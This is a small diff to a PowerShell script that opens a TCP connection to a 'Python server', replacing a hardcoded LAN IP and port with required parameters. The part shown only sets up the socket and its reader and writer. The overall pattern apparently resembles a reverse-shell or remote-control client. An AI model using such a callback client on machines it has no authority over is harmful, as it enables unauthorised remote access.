@@ -1,8 +1,12 @@
-$IPAddress = "192.168.8.23"  # IP address of the Python server
-$Port = 9999              # The port number on which the server is listening
-
+param(
+    [Parameter(Mandatory=$true)]
+    $ServerIPAddress,  # IP address of the Python server
+    [Parameter(Mandatory=$true)]
+    $Port              # The port number on which the server is listening
+    )
+# Opens Tcp socket session with server
 try {
-    $client = New-Object System.Net.Sockets.TcpClient($IPAddress, $Port)
+    $client = New-Object System.Net.Sockets.TcpClient($ServerIPAddress, $Port)
     $stream = $client.GetStream()
     $reader = New-Object System.IO.StreamReader($stream)
     $writer = New-Object System.IO.StreamWriter($stream)
@@ -24,4 +28,3 @@ try {
     $stream.Close()
     $client.Close()
 }
-
